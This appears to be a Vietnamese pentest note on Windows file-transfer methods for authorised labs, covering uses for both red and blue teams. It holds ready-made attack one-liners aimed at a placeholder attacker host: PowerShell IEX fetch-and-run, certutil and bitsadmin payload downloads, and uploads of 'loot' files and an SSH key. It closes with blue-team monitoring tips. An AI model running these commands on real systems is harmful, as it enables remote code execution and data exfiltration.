---
layout: post
title: "Windows File Transfer Methods"
render_with_liquid: false
categories:
  - File Transfer
tags:
  - file-transfer
  - windows
source_collection: manual
---
Topics: Windows, File Transfer

## Overview

Ghi chú nhanh các cách chuyển file trên Windows trong môi trường lab hoặc hệ thống được phép kiểm thử. Kiến thức này hữu ích cho cả red team và blue team:

- Red team cần biết nhiều đường truyền file để chọn phương án phù hợp với quyền hạn, network path, proxy, EDR/AV, và shell hiện có.
- Blue team cần hiểu các kỹ thuật này để giám sát, hardening, chặn traffic không cần thiết, và viết detection cho hành vi bất thường.

`Fileless` không có nghĩa là không có hoạt động truyền dữ liệu. Nó thường có nghĩa là payload không được lưu lâu dài như một file rõ ràng trên disk, mà được tải về bằng tool hợp pháp rồi chạy trong memory. Ví dụ chuỗi tấn công Astaroth từng lạm dụng nhiều Windows living-off-the-land binaries: LNK gọi `wmic`, tải JavaScript qua tham số `/Format`, dùng `bitsadmin` để tải payload, dùng `certutil` để decode Base64, rồi `regsvr32` để load DLL.

Trước khi dùng bất kỳ phương pháp nào, cần xác định hướng truyền file:

- Download: đưa file từ server về Windows target
- Upload: đưa file từ Windows target về máy của mình
- Internal copy: copy giữa các host Windows hoặc qua SMB share

## Quick Checklist

- Kiểm tra target có outbound HTTP/HTTPS không.
- Kiểm tra TCP/445 SMB có bị chặn khi đi ra ngoài network không.
- Kiểm tra PowerShell có dùng được không.
- Kiểm tra có sẵn `curl.exe`, `certutil.exe`, `bitsadmin.exe`, `ftp.exe`, `scp.exe`, hoặc SMB access không.
- Kiểm tra shell có interactive hay chỉ chạy được command một dòng.
- Ưu tiên HTTPS/SMB khi có thể để giảm lỗi do proxy, encoding, hoặc binary corruption.
- Luôn verify hash sau khi transfer file binary, archive, key, hoặc dữ liệu quan trọng.

## Download Operations

Download là đưa file từ máy của mình hoặc server trung gian về Windows target.

## PowerShell Base64 Decode

Khi không có network hoặc chỉ copy/paste được text, có thể encode file thành Base64 ở máy nguồn rồi decode trên Windows.

Trên Linux/Pwnbox, kiểm tra hash và encode file:

```bash
md5sum id_rsa
base64 -w 0 id_rsa > id_rsa.b64
```

Trên Windows, paste chuỗi Base64 vào file hoặc biến rồi decode:

```powershell
$b64 = Get-Content .\id_rsa.b64
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String($b64))
```

Verify lại bằng MD5:

```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5
```

Lưu ý:

- `cmd.exe` có giới hạn độ dài command khoảng `8191` ký tự.
- Web shell hoặc remote command interface có thể lỗi khi gửi chuỗi quá dài.
- Base64 phù hợp cho file nhỏ; với file lớn nên dùng HTTP, SMB, FTP, SCP, hoặc WebDAV.

## PowerShell Web Downloads

PowerShell có nhiều cách tải file qua `HTTP`, `HTTPS`, hoặc `FTP`.

### Net.WebClient

`System.Net.WebClient` dùng được trên nhiều phiên bản PowerShell:

```powershell
(New-Object Net.WebClient).DownloadFile("http://<attacker-ip>/tool.exe", "C:\Windows\Temp\tool.exe")
```

Tải bất đồng bộ:

```powershell
(New-Object Net.WebClient).DownloadFileAsync("http://<attacker-ip>/tool.exe", "C:\Windows\Temp\tool.exe")
```

Các method thường gặp:

| Method | Ý nghĩa |
| --- | --- |
| `OpenRead` | Trả dữ liệu từ resource dưới dạng stream. |
| `DownloadData` | Tải dữ liệu và trả về byte array. |
| `DownloadFile` | Tải dữ liệu từ URL và ghi ra file local. |
| `DownloadString` | Tải dữ liệu dạng string, thường dùng cho script text. |
| `OpenReadAsync`, `DownloadDataAsync`, `DownloadFileAsync`, `DownloadStringAsync` | Biến thể async, không block thread gọi. |

### DownloadString In Memory

Nếu cần load script text vào memory trong lab, có thể dùng `DownloadString` kết hợp `Invoke-Expression` (`IEX`):

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://<attacker-ip>/script.ps1")
```

Hoặc qua pipeline:

```powershell
(New-Object Net.WebClient).DownloadString("http://<attacker-ip>/script.ps1") | IEX
```

Cách này không ghi script xuống disk theo đường tải thông thường, nên cần hiểu rõ rủi ro vận hành và log/detection. Chỉ chạy script bạn kiểm soát và trong môi trường được phép.

### Invoke-WebRequest

```powershell
iwr -Uri "http://<attacker-ip>/tool.exe" -OutFile "C:\Windows\Temp\tool.exe"
```

Tên đầy đủ:

```powershell
Invoke-WebRequest -Uri "http://<attacker-ip>/file.txt" -OutFile "C:\Windows\Temp\file.txt"
```

Từ PowerShell 3.0 trở đi, `Invoke-WebRequest` có sẵn. Các alias thường gặp là `iwr`, `curl`, và `wget`, nhưng trên Windows mới nên gọi rõ `curl.exe` nếu muốn dùng curl thật.

Nếu gặp lỗi Internet Explorer first-launch hoặc parser engine:

```powershell
Invoke-WebRequest -Uri "http://<attacker-ip>/script.ps1" -UseBasicParsing -OutFile "C:\Windows\Temp\script.ps1"
```

Nếu gặp lỗi trust SSL/TLS trong lab với certificate không tin cậy:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

Chỉ dùng bypass certificate validation trong lab. Trong môi trường thật, nên sửa certificate chain thay vì bỏ qua kiểm tra TLS.

## Certutil Download

```cmd
certutil.exe -urlcache -split -f http://<attacker-ip>/tool.exe C:\Windows\Temp\tool.exe
```

Sau khi tải xong, có thể xóa cache URL nếu cần giữ môi trường sạch:

```cmd
certutil.exe -urlcache -f http://<attacker-ip>/tool.exe delete
```

`certutil` cũng hay được dùng để decode Base64:

```cmd
certutil.exe -decode encoded.txt decoded.bin
```

## Curl On Windows

Windows 10/Windows Server 2019 trở lên thường có `curl.exe` mặc định:

```cmd
curl.exe -o C:\Windows\Temp\tool.exe http://<attacker-ip>/tool.exe
```

## Bitsadmin

```cmd
bitsadmin /transfer job1 /download /priority normal http://<attacker-ip>/tool.exe C:\Windows\Temp\tool.exe
```

BITS phù hợp khi cần tải file qua HTTP/HTTPS nhưng lệnh này cũ, có thể không ổn định trên một số phiên bản Windows mới.

## SMB Downloads

SMB chạy phổ biến trên TCP/445 trong môi trường Windows enterprise. Trên Pwnbox/Linux, có thể tạo SMB server nhanh bằng Impacket:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

Copy file từ SMB server về Windows:

```cmd
copy \\<smb-server>\share\tool.exe C:\Windows\Temp\tool.exe
```

Hoặc dùng PowerShell:

```powershell
Copy-Item "\\<smb-server>\share\tool.exe" "C:\Windows\Temp\tool.exe"
```

Windows mới thường chặn unauthenticated guest access. Khi đó tạo SMB server có user/password:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Mount share trên Windows:

```cmd
net use n: \\<smb-server>\share /user:test test
copy n:\tool.exe C:\Windows\Temp\tool.exe
net use n: /delete
```

Nếu `copy \\IP\share\file` lỗi, mount bằng `net use` thường dễ debug hơn.

## FTP Downloads

FTP dùng TCP/21 cho control channel và TCP/20 hoặc passive ports cho data. Có thể dựng server nhanh bằng `pyftpdlib`:

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

Download bằng PowerShell `Net.WebClient`:

```powershell
(New-Object Net.WebClient).DownloadFile("ftp://<ftp-server>/file.txt", "C:\Users\Public\ftp-file.txt")
```

Khi shell không interactive, tạo command file cho `ftp.exe`:

```cmd
echo open <ftp-server> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt C:\Windows\Temp\file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp.exe -v -n -s:ftpcommand.txt
```

Luôn dùng `binary` khi tải executable, archive, image, key, hoặc dữ liệu không phải plain text.

## SCP Downloads

Nếu Windows có OpenSSH client:

```cmd
scp.exe user@<server-ip>:/tmp/tool.exe C:\Windows\Temp\tool.exe
```

## TFTP

Nếu TFTP client được bật:

```cmd
tftp -i <server-ip> GET tool.exe C:\Windows\Temp\tool.exe
```

TFTP thường bị firewall chặn và không được bật mặc định trên nhiều hệ thống Windows.

## Upload Operations

Upload là đưa file từ Windows target về máy của mình hoặc server trung gian.

## PowerShell Base64 Encode

Khi chỉ cần lấy file nhỏ và không có kênh upload ổn định, có thể encode file trên Windows rồi paste về Linux/Pwnbox.

Encode file bằng PowerShell:

```powershell
[Convert]::ToBase64String((Get-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Encoding Byte))
```

Tính hash để verify:

```powershell
Get-FileHash "C:\Windows\System32\drivers\etc\hosts" -Algorithm MD5
```

Decode trên Linux/Pwnbox:

```bash
echo "<base64-data>" | base64 -d > hosts
md5sum hosts
```

## PowerShell Web Uploads

PowerShell không có một cmdlet upload file chuyên dụng cho mọi server, nhưng có thể dùng `Invoke-WebRequest`, `Invoke-RestMethod`, `curl.exe`, hoặc helper script tùy endpoint nhận file.

Tạo server nhận upload bằng Python module `uploadserver`:

```bash
pip3 install uploadserver
python3 -m uploadserver
```

Server sẽ nhận file tại `/upload`, mặc định trên port `8000`.

Upload dạng raw body:

```powershell
Invoke-WebRequest -Uri "http://<attacker-ip>:8000/" -Method POST -InFile "C:\Windows\Temp\loot.txt"
```

Upload dạng multipart bằng `curl.exe`:

```cmd
curl.exe -X POST -F "file=@C:\Windows\Temp\loot.txt" http://<attacker-ip>:8000/upload
```

Nếu dùng helper function nội bộ để wrap `Invoke-RestMethod`, pattern thường là:

```powershell
Invoke-FileUpload -Uri "http://<attacker-ip>:8000/upload" -File "C:\Windows\Temp\loot.txt"
```

## PowerShell Base64 POST

Có thể gửi nội dung Base64 qua HTTP POST về một listener đơn giản như Netcat:

```powershell
$b64 = [Convert]::ToBase64String((Get-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Encoding Byte))
Invoke-WebRequest -Uri "http://<attacker-ip>:8000/" -Method POST -Body $b64
```

Trên Linux/Pwnbox:

```bash
nc -lvnp 8000
```

Sau khi copy phần body Base64 nhận được:

```bash
echo "<base64-data>" | base64 -d > hosts
```

## SMB Uploads

Nếu outbound TCP/445 không bị chặn, có thể upload file về SMB share:

```cmd
copy C:\Windows\Temp\loot.txt \\<smb-server>\share\loot.txt
```

Với SMB server có credential:

```cmd
net use \\<smb-server>\share /user:<domain>\<user> <password>
copy C:\Windows\Temp\loot.txt \\<smb-server>\share\loot.txt
net use \\<smb-server>\share /delete
```

Trong nhiều doanh nghiệp, SMB outbound ra internet bị chặn để giảm rủi ro lateral movement và credential exposure.

## WebDAV Uploads

WebDAV là extension của HTTP/HTTPS, cho phép web server hoạt động giống file share. Đây là lựa chọn thay thế khi SMB outbound bị chặn nhưng HTTP/HTTPS được phép.

Cài và chạy WebDAV server trên Linux/Pwnbox:

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

Trên Windows, truy cập bằng `DavWWWRoot`:

```cmd
dir \\<webdav-server>\DavWWWRoot
```

Upload file:

```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\<webdav-server>\DavWWWRoot\
```

Hoặc nếu server có thư mục cụ thể:

```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\<webdav-server>\sharefolder\
```

`DavWWWRoot` là keyword đặc biệt của Windows WebDAV mini-redirector, không phải thư mục thật trên server.

## FTP Uploads

Cho phép write trên FTP server:

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

Upload bằng PowerShell:

```powershell
(New-Object Net.WebClient).UploadFile("ftp://<ftp-server>/hosts", "C:\Windows\System32\drivers\etc\hosts")
```

Upload bằng `ftp.exe` command file:

```cmd
echo open <ftp-server> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT C:\Windows\System32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp.exe -v -n -s:ftpcommand.txt
```

## SCP Uploads

Nếu Windows có OpenSSH client:

```cmd
scp.exe C:\Windows\Temp\loot.txt user@<server-ip>:/tmp/loot.txt
```

## Verify File Integrity

Tính hash trên Windows:

```powershell
Get-FileHash C:\Windows\Temp\tool.exe -Algorithm SHA256
```

Tính hash trên Linux:

```bash
sha256sum tool.exe
```

Hash hai bên nên giống nhau trước khi chạy file hoặc dùng dữ liệu đã transfer.

## Notes

- HTTP/HTTPS thường nhanh nhất để download.
- SMB thuận tiện khi đã có credential hoặc cùng network segment.
- FTP phù hợp trong lab nhưng dễ bị chặn và không bảo mật nếu không có TLS.
- WebDAV hữu ích khi cần semantics giống SMB nhưng đi qua HTTP/HTTPS.
- Base64 hữu ích trong shell hạn chế, nhưng không phù hợp cho file lớn hoặc command length ngắn.
- Luôn kiểm tra path có quyền ghi, ví dụ `C:\Windows\Temp`, `%TEMP%`, hoặc thư mục user hiện tại.
- Với blue team, nên log/giám sát các tool như `powershell.exe`, `certutil.exe`, `bitsadmin.exe`, `ftp.exe`, `curl.exe`, `regsvr32.exe`, `wmic.exe`, và kết nối outbound bất thường.
